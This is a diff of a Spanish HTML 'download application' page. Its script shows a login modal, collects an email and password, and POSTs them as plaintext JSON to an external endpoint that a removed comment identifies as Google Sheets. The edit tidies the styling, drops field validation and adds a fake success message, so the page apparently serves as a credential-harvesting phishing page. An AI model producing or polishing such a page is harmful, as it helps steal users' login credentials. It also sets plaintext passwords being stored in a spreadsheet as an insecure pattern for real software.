@@ -4,54 +4,13 @@
   <meta charset="UTF-8">
   <title>Descargar Aplicación</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-    }
-    /* Botón principal */
-    .btn {
-      padding: 12px 24px;
-      background: #007bff;
-      color: white;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-      font-size: 16px;
-    }
-    .btn:hover {
-      background: #0056b3;
-    }
-    /* Modal */
-    .modal {
-      display: none;
-      position: fixed;
-      z-index: 999;
-      left: 0; top: 0;
-      width: 100%; height: 100%;
-      background-color: rgba(0,0,0,0.5);
-      justify-content: center;
-      align-items: center;
-    }
-    .modal-content {
-      background: white;
-      padding: 20px;
-      border-radius: 10px;
-      text-align: center;
-      width: 300px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.3);
-    }
-    .input {
-      width: 90%;
-      padding: 8px;
-      margin: 8px 0;
-      border: 1px solid #ccc;
-      border-radius: 4px;
-    }
-    .loading {
-      display: none;
-      margin-top: 10px;
-      color: #007bff;
-      font-weight: bold;
-    }
+    body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
+    .btn { padding: 12px 24px; background: #007bff; color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 16px; }
+    .btn:hover { background: #0056b3; }
+    .modal { display: none; position: fixed; z-index: 999; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.5); justify-content: center; align-items: center; }
+    .modal-content { background: white; padding: 20px; border-radius: 10px; text-align: center; width: 300px; box-shadow: 0 0 10px rgba(0,0,0,0.3); }
+    .input { width: 90%; padding: 8px; margin: 8px 0; border: 1px solid #ccc; border-radius: 4px; }
+    .loading { display: none; margin-top: 10px; color: #007bff; font-weight: bold; }
   </style>
 </head>
 <body>
@@ -63,8 +22,8 @@
   <div class="modal" id="miModal">
     <div class="modal-content">
       <h2>Iniciar sesión</h2>
-      <input type="email" id="correo" class="input" placeholder="Correo" required>
-      <input type="password" id="contrasena" class="input" placeholder="Contraseña" required>
+      <input type="text" id="correo" class="input" placeholder="Correo">
+      <input type="password" id="contrasena" class="input" placeholder="Contraseña">
       <br>
       <button class="btn" onclick="registrar()">Registrar</button>
       <div class="loading" id="loading">Cargando...</div>
@@ -84,14 +43,12 @@
       const loading = document.getElementById("loading");
 
       if (!correo || !contrasena) {
-        alert("Por favor ingresa tu correo y contraseña");
+        alert("Por favor completa ambos campos");
         return;
       }
 
-      // Mostrar cargando
       loading.style.display = "block";
 
-      // Enviar a Google Sheets
       fetch(url, {
         method: "POST",
         body: JSON.stringify({ correo: correo, contrasena: contrasena })
@@ -100,15 +57,16 @@
       .then(() => {
         setTimeout(() => {
           loading.style.display = "none";
-          document.getElementById("miModal").style.display = "none";
           document.getElementById("correo").value = "";
           document.getElementById("contrasena").value = "";
-        }, 2000); // espera 2 segundos
+          document.getElementById("miModal").style.display = "none";
+          alert("¡Datos registrados correctamente!");
+        }, 2000); // simula carga de 2 segundos
       })
       .catch(err => {
         console.error("Error:", err);
-        alert("Ocurrió un error al registrar");
         loading.style.display = "none";
+        alert("Ocurrió un error al registrar");
       });
     }
 
